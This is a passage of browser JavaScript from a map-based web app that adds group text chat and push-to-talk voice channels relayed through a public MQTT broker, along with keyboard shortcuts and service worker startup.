    // ---- Chat Controls ----
    window.SGP.chatToggleConnection = function() {
        if (chatState.connected) chatDisconnect(); else chatConnect();
    };

    window.SGP.chatSetName = function(name) {
        name = name.trim().substring(0, 20);
        if (!name) name = 'Agent-' + Math.random().toString(36).substr(2, 4).toUpperCase();
        chatState.myName = name;
        localStorage.setItem('sgp_chat_name', name);
    };

    window.SGP.chatCreateGroup = function() {
        const code = generateUUID();
        const name = 'Group-' + code.substring(0, 4).toUpperCase();
        chatState.groups[code] = { name, createdAt: Date.now() };
        chatState.messages[code] = [];
        chatState.activeGroup = code;
        localStorage.setItem('sgp_chat_active', code);
        saveChatGroups();
        saveChatMessages();
        // Subscribe if connected
        if (chatState.mqttClient && chatState.connected) {
            chatState.mqttClient.subscribe('sgp/chat/' + code + '/msg', { qos: 0 });
            chatState.mqttClient.subscribe('sgp/chat/' + code + '/presence', { qos: 0 });
            chatState.mqttClient.subscribe('sgp/chat/' + code + '/call', { qos: 0 });
        }
        showToast('✅ Group created — share code to invite');
        refreshCommsPanel();
    };

    window.SGP.chatJoinGroup = function() {
        const code = document.getElementById('chat-join-code')?.value?.trim();
        if (!code || code.length < 8) { showToast('⚠ Invalid code'); return; }
        if (chatState.groups[code]) { showToast('⚠ Already in this group'); return; }
        const name = 'Group-' + code.substring(0, 4).toUpperCase();
        chatState.groups[code] = { name, createdAt: Date.now() };
        chatState.messages[code] = [];
        chatState.activeGroup = code;
        localStorage.setItem('sgp_chat_active', code);
        saveChatGroups();
        saveChatMessages();
        if (chatState.mqttClient && chatState.connected) {
            chatState.mqttClient.subscribe('sgp/chat/' + code + '/msg', { qos: 0 });
            chatState.mqttClient.subscribe('sgp/chat/' + code + '/presence', { qos: 0 });
            chatState.mqttClient.subscribe('sgp/chat/' + code + '/call', { qos: 0 });
            chatState.mqttClient.publish('sgp/chat/' + code + '/presence', JSON.stringify({
                id: chatState.myId, name: chatState.myName, action: 'join', ts: Date.now()
            }), { qos: 0 });
        }
        showToast('✅ Joined group');
        refreshCommsPanel();
    };

    window.SGP.chatLeaveGroup = function(code) {
        if (chatState.mqttClient && chatState.connected) {
            chatState.mqttClient.unsubscribe('sgp/chat/' + code + '/msg');
            chatState.mqttClient.unsubscribe('sgp/chat/' + code + '/presence');
            chatState.mqttClient.unsubscribe('sgp/chat/' + code + '/call');
        }
        delete chatState.groups[code];
        delete chatState.messages[code];
        delete chatState.groupUsers[code];
        if (chatState.activeGroup === code) chatState.activeGroup = null;
        saveChatGroups();
        saveChatMessages();
        showToast('🗑 Left group');
        refreshCommsPanel();
    };

    window.SGP.chatSelectGroup = function(code) {
        chatState.activeGroup = code;
        localStorage.setItem('sgp_chat_active', code);
        // Mark messages as read
        if (chatState.messages[code]) {
            chatState.messages[code].forEach(m => m.read = true);
            saveChatMessages();
        }
        refreshCommsPanel();
    };

    window.SGP.chatSendMsg = function() {
        const input = document.getElementById('chat-msg-input');
        if (!input) return;
        const text = input.value.trim();
        if (!text) return;
        if (!chatState.connected) { showToast('⚠ Connect first'); return; }
        if (!chatState.activeGroup) return;

        const msg = { from: chatState.myId, fromName: chatState.myName, text, ts: Date.now(), read: true };
        if (!chatState.messages[chatState.activeGroup]) chatState.messages[chatState.activeGroup] = [];
        chatState.messages[chatState.activeGroup].push(msg);
        saveChatMessages();

        // Publish via MQTT
        chatState.mqttClient.publish('sgp/chat/' + chatState.activeGroup + '/msg', JSON.stringify(msg), { qos: 0 });
        input.value = '';
        refreshCommsPanel();
    };

    window.SGP.chatCopyGroupCode = function() {
        if (!chatState.activeGroup) return;
        navigator.clipboard.writeText(chatState.activeGroup).then(() => {
            showToast('📋 Group code copied');
        }).catch(() => {
            const el = document.createElement('textarea');
            el.value = chatState.activeGroup;
            document.body.appendChild(el); el.select(); document.execCommand('copy');
            document.body.removeChild(el);
            showToast('📋 Code copied');
        });
    };

    window.SGP.chatToggleCall = function() {
        if (!chatState.connected || !chatState.activeGroup) return;
        chatState.groupCallActive = !chatState.groupCallActive;

        if (chatState.groupCallActive) {
            // Start recording and streaming audio to group
            navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
                chatState.callStream = stream;
                const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
                chatState.callRecorder = recorder;
                recorder.ondataavailable = async (e) => {
                    if (e.data.size > 0 && chatState.groupCallActive) {
                        const reader = new FileReader();
                        reader.onload = () => {
                            const base64 = reader.result.split(',')[1];
                            if (chatState.mqttClient && chatState.connected) {
                                chatState.mqttClient.publish('sgp/chat/' + chatState.activeGroup + '/call', JSON.stringify({
                                    from: chatState.myId, audio: base64, ts: Date.now()
                                }), { qos: 0 });
                            }
                        };
                        reader.readAsDataURL(e.data);
                    }
                };
                recorder.start(1000); // Send audio chunks every 1 second
                showToast('📞 Group call started');
            }).catch(() => {
                chatState.groupCallActive = false;
                showToast('⚠ Microphone access denied');
            });
        } else {
            if (chatState.callRecorder) { try { chatState.callRecorder.stop(); } catch(e) {} }
            if (chatState.callStream) { chatState.callStream.getTracks().forEach(t => t.stop()); }
            chatState.callRecorder = null;
            chatState.callStream = null;
            showToast('📞 Call ended');
        }
        refreshCommsPanel();
    };

    function formatWalkieTime(ts) {
        if (!ts) return '--';
        const diff = Math.floor((Date.now() - ts) / 1000);
        if (diff < 5) return 'now';
        if (diff < 60) return diff + 's';
        if (diff < 3600) return Math.floor(diff / 60) + 'm';
        return Math.floor(diff / 3600) + 'h';
    }

    function walkieLog(msg, type) {
        const now = new Date();
        const time = String(now.getHours()).padStart(2, '0') + ':' +
                     String(now.getMinutes()).padStart(2, '0') + ':' +
                     String(now.getSeconds()).padStart(2, '0');
        walkieState.log.push({ time, msg, type: type || 'info' });
        if (walkieState.log.length > 50) walkieState.log.shift();
        refreshCommsPanel();
    }

    function refreshCommsPanel() {
        if (state.panelOpen !== 'comms') return;
        const body = document.getElementById('panel-body');
        if (body) {
            body.innerHTML = renderCommsPanel();
            initCommsPanel();
        }
    }

    // ---- MQTT Connection ----
    window.SGP.walkieToggleConnection = function() {
        if (walkieState.connected) {
            walkieDisconnect();
        } else {
            walkieConnect();
        }
    };

    function walkieConnect() {
        if (walkieState.mqttClient) {
            try { walkieState.mqttClient.end(true); } catch(e) {}
        }

        walkieLog('Conectando al relay...', 'info');

        try {
            const clientId = 'sgp_' + walkieState.callsign + '_' + Date.now();
            const client = mqtt.connect('wss://broker.hivemq.com:8884/mqtt', {
                clientId: clientId,
                clean: true,
                connectTimeout: 10000,
                keepalive: 30,
                reconnectPeriod: 5000
            });

            client.on('connect', () => {
                walkieState.connected = true;
                walkieState.mqttClient = client;
                walkieLog('✅ CONNECTED — Canal ' + walkieState.channel, 'success');
                showToast('📻 WALKIE-TALKIE CONNECTED');

                // Subscribe to current channel
                walkieSubscribeChannel(walkieState.channel);

                // Send presence
                walkieSendPresence('join');

                // Presence keepalive
                walkieState.presenceInterval = setInterval(() => {
                    walkieSendPresence('ping');
                    // Clean stale users (>30s without ping)
                    const now = Date.now();
                    Object.entries(walkieState.users).forEach(([cs, u]) => {
                        if (now - u.lastSeen > 30000) {
                            delete walkieState.users[cs];
                        }
                    });
                }, 10000);

                refreshCommsPanel();
            });

            client.on('message', (topic, message) => {
                try {
                    const data = JSON.parse(message.toString());
                    handleWalkieMessage(topic, data);
                } catch (e) {
                    // Binary audio message
                    handleWalkieAudio(topic, message);
                }
            });

            client.on('error', (err) => {
                walkieLog('⚠ Error: ' + (err.message || 'Connection failed'), 'error');
            });

            client.on('close', () => {
                walkieState.connected = false;
                if (walkieState.presenceInterval) {
                    clearInterval(walkieState.presenceInterval);
                    walkieState.presenceInterval = null;
                }
                refreshCommsPanel();
            });

            client.on('reconnect', () => {
                walkieLog('🔄 Reconnecting...', 'info');
            });

        } catch (e) {
            walkieLog('❌ Error: ' + e.message, 'error');
        }
    }

    function walkieDisconnect() {
        if (walkieState.mqttClient) {
            walkieSendPresence('leave');
            setTimeout(() => {
                try { walkieState.mqttClient.end(true); } catch(e) {}
                walkieState.mqttClient = null;
                walkieState.connected = false;
                walkieState.users = {};
                walkieLog('⏏ DISCONNECTED', 'info');
                showToast('📻 WALKIE-TALKIE DISCONNECTED');
                if (walkieState.presenceInterval) {
                    clearInterval(walkieState.presenceInterval);
                    walkieState.presenceInterval = null;
                }
                refreshCommsPanel();
            }, 200);
        }
    }

    function walkieSubscribeChannel(ch) {
        const client = walkieState.mqttClient;
        if (!client) return;

        const audioTopic = 'sgp/walkie/ch' + ch + '/audio';
        const presenceTopic = 'sgp/walkie/ch' + ch + '/presence';

        client.subscribe([audioTopic, presenceTopic], { qos: 0 }, (err) => {
            if (!err) {
                walkieLog('📻 Listening on Channel ' + String(ch).padStart(2, '0'), 'info');
            }
        });
    }

    function walkieUnsubscribeChannel(ch) {
        const client = walkieState.mqttClient;
        if (!client) return;

        const audioTopic = 'sgp/walkie/ch' + ch + '/audio';
        const presenceTopic = 'sgp/walkie/ch' + ch + '/presence';
        client.unsubscribe([audioTopic, presenceTopic]);
    }

    function walkieSendPresence(action) {
        const client = walkieState.mqttClient;
        if (!client || !walkieState.connected) return;

        const topic = 'sgp/walkie/ch' + walkieState.channel + '/presence';
        const msg = JSON.stringify({
            from: walkieState.callsign,
            action: action,
            channel: walkieState.channel,
            ts: Date.now()
        });
        client.publish(topic, msg, { qos: 0 });
    }

    function handleWalkieMessage(topic, data) {
        if (topic.includes('/presence')) {
            // Update user list
            if (data.from === walkieState.callsign) return; // Ignore self

            if (data.action === 'leave') {
                delete walkieState.users[data.from];
                walkieLog(data.from + ' left the channel', 'leave');
            } else {
                const isNew = !walkieState.users[data.from];
                walkieState.users[data.from] = {
                    lastSeen: Date.now(),
                    channel: data.channel || walkieState.channel
                };
                if (isNew && data.action === 'join') {
                    walkieLog(data.from + ' joined the channel', 'join');
                    // Reply with our presence so they see us
                    walkieSendPresence('ping');
                }
            }
            refreshCommsPanel();
        } else if (topic.includes('/audio')) {
            // JSON audio message (with metadata)
            if (data.from === walkieState.callsign) return;
            if (data.audio) {
                walkieLog('📡 ' + data.from + ' transmitted', 'rx');
                walkiePlayAudio(data.audio, data.from);
            }
        }
    }

    function handleWalkieAudio(topic, message) {
        // Raw binary audio — not used in this implementation
    }

    // ---- Channel Change ----
    window.SGP.walkieChangeChannel = function(delta) {
        const oldCh = walkieState.channel;
        let newCh = walkieState.channel + delta;
        if (newCh < 1) newCh = 16;
        if (newCh > 16) newCh = 1;
        walkieState.channel = newCh;
        localStorage.setItem('sgp_walkie_ch', newCh);

        if (walkieState.connected) {
            walkieSendPresence('leave');
            walkieUnsubscribeChannel(oldCh);
            walkieSubscribeChannel(newCh);
            walkieSendPresence('join');
            walkieState.users = {};
        }

        walkieLog('📻 Cambio a Canal ' + String(newCh).padStart(2, '0'), 'info');
        refreshCommsPanel();
    };

    window.SGP.walkieSetCallsign = function(cs) {
        cs = cs.trim().toUpperCase().replace(/[^A-Z0-9\-_]/g, '').substr(0, 12);
        if (!cs) cs = 'OP-' + Math.random().toString(36).substr(2, 4).toUpperCase();
        walkieState.callsign = cs;
        localStorage.setItem('sgp_walkie_cs', cs);
        if (walkieState.connected) {
            walkieSendPresence('ping');
        }
    };

    window.SGP.walkieSetVolume = function(val) {
        walkieState.volume = parseFloat(val);
        localStorage.setItem('sgp_walkie_vol', val);
    };

    // ---- Push-To-Talk ----
    async function walkieStartPTT() {
        if (!walkieState.connected || walkieState.pttActive) return;

        try {
            // Request microphone
            if (!walkieState.audioStream) {
                walkieState.audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        autoGainControl: true,
                        channelCount: 1,
                        sampleRate: 16000
                    }
                });
            }

            walkieState.audioChunks = [];
            const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
                ? 'audio/webm;codecs=opus'
                : MediaRecorder.isTypeSupported('audio/webm')
                ? 'audio/webm'
                : 'audio/ogg;codecs=opus';

            walkieState.mediaRecorder = new MediaRecorder(walkieState.audioStream, {
                mimeType: mimeType,
                audioBitsPerSecond: 16000
            });

            walkieState.mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    walkieState.audioChunks.push(e.data);
                }
            };

            walkieState.mediaRecorder.onstop = () => {
                if (walkieState.audioChunks.length > 0) {
                    const blob = new Blob(walkieState.audioChunks, { type: mimeType });
                    walkieSendAudio(blob);
                }
            };

            walkieState.mediaRecorder.start(100); // collect chunks every 100ms
            walkieState.pttActive = true;
            walkieLog('🔴 TX — Transmitting...', 'tx');
            refreshCommsPanel();

        } catch (e) {
            walkieLog('❌ Microphone: ' + e.message, 'error');
            showToast('⚠ MICROPHONE PERMISSION REQUIRED');
        }
    }

    function walkieStopPTT() {
        if (!walkieState.pttActive) return;

        walkieState.pttActive = false;
        if (walkieState.mediaRecorder && walkieState.mediaRecorder.state === 'recording') {
            walkieState.mediaRecorder.stop();
        }
        walkieLog('⬜ TX end', 'info');
        refreshCommsPanel();
    }

    async function walkieSendAudio(blob) {
        const client = walkieState.mqttClient;
        if (!client || !walkieState.connected) return;

        try {
            const reader = new FileReader();
            reader.onloadend = () => {
                const base64 = reader.result.split(',')[1];
                // Limit message size (~500KB max for MQTT)
                if (base64.length > 500000) {
                    walkieLog('⚠ Audio too long', 'error');
                    return;
                }

                const topic = 'sgp/walkie/ch' + walkieState.channel + '/audio';
                const msg = JSON.stringify({
                    from: walkieState.callsign,
                    audio: base64,
                    mime: blob.type,
                    ts: Date.now()
                });
                client.publish(topic, msg, { qos: 0 });
                walkieLog('📤 Audio sent (' + Math.round(blob.size / 1024) + 'KB)', 'tx');
            };
            reader.readAsDataURL(blob);
        } catch (e) {
            walkieLog('❌ Send error: ' + e.message, 'error');
        }
    }

    // ---- Audio Playback ----
    function walkiePlayAudio(base64, from) {
        walkieState.playQueue.push({ base64, from });
        if (!walkieState.playing) {
            walkieProcessPlayQueue();
        }
    }

    function walkieProcessPlayQueue() {
        if (walkieState.playQueue.length === 0) {
            walkieState.playing = false;
            return;
        }

        walkieState.playing = true;
        const item = walkieState.playQueue.shift();

        try {
            // Play roger beep before audio
            playWalkieBeep(800, 0.08).then(() => {
                const audioBlob = base64ToBlob(item.base64, 'audio/webm');
                const audioUrl = URL.createObjectURL(audioBlob);
                const audio = new Audio(audioUrl);
                audio.volume = walkieState.volume;

                audio.onended = () => {
                    URL.revokeObjectURL(audioUrl);
                    // Small delay between messages
                    setTimeout(() => walkieProcessPlayQueue(), 200);
                };

                audio.onerror = () => {
                    URL.revokeObjectURL(audioUrl);
                    walkieLog('⚠ Audio playback error from ' + item.from, 'error');
                    setTimeout(() => walkieProcessPlayQueue(), 100);
                };

                audio.play().catch(() => {
                    walkieLog('⚠ Playback blocked — tap the screen', 'error');
                    walkieState.playing = false;
                });
            });
        } catch (e) {
            walkieState.playing = false;
            walkieProcessPlayQueue();
        }
    }

    function playWalkieBeep(freq, duration) {
        return new Promise(resolve => {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.frequency.value = freq;
                osc.type = 'sine';
                gain.gain.value = walkieState.volume * 0.3;
                gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
                osc.start(ctx.currentTime);
                osc.stop(ctx.currentTime + duration);
                setTimeout(() => {
                    ctx.close();
                    resolve();
                }, duration * 1000 + 50);
            } catch (e) {
                resolve();
            }
        });
    }

    function base64ToBlob(base64, mime) {
        const binary = atob(base64);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
        }
        return new Blob([bytes], { type: mime || 'audio/webm' });
    }

    // Also handle COMMS button from bottom bar
    document.querySelectorAll('.bottom-btn[data-action="comms"]').forEach(btn => {
        btn.addEventListener('click', () => {
            if (state.panelOpen === 'comms') closePanel();
            else openPanel('comms');
        });
    });

    // =========================================
    // KEYBOARD SHORTCUTS
    // =========================================
    document.addEventListener('keydown', (e) => {
        switch (e.key) {
            case '1': selectTool('pan'); break;
            case '2': selectTool('marker'); break;
            case '3': selectTool('route'); break;
            case '4': selectTool('zone'); break;
            case '5': selectTool('measure'); break;
            case 'Escape': closeMarkerForm(); closePanel(); selectTool('pan'); break;
        }
    });

    // =========================================
    // SERVICE WORKER
    // =========================================
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js').catch(() => {});
    }

    // =========================================
    // START
    // =========================================
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', bootSequence);
    } else {
        bootSequence();
    }

})();
